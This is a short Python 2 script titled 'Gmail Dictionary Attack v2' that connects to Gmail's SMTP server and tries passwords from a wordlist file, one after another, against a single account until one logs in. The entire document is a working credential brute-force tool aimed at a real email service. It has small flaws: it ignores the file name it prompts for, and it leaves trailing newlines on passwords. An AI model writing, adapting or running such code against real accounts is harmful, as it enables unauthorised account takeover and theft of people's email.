# Program: Gmail Dictionary Attack v2
# Author: dropnfly23
# Purpose: Brute force smtp.gmail.com using a dictionary attack over TLS.

import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587,timeout=None)
smtpserver.ehlo()
smtpserver.starttls()

user = 'mygmail@gmail.com'
passwfile = raw_input("Enter the password file name: ")
passwfile = open("./dico.txt", "r")

for password in passwfile:
	try:
		smtpserver.login(user, password)

		print "[+] Password Found: %s" % password
		break;
	except smtplib.SMTPAuthenticationError:
		print "[!] Password Incorrect: %s" % password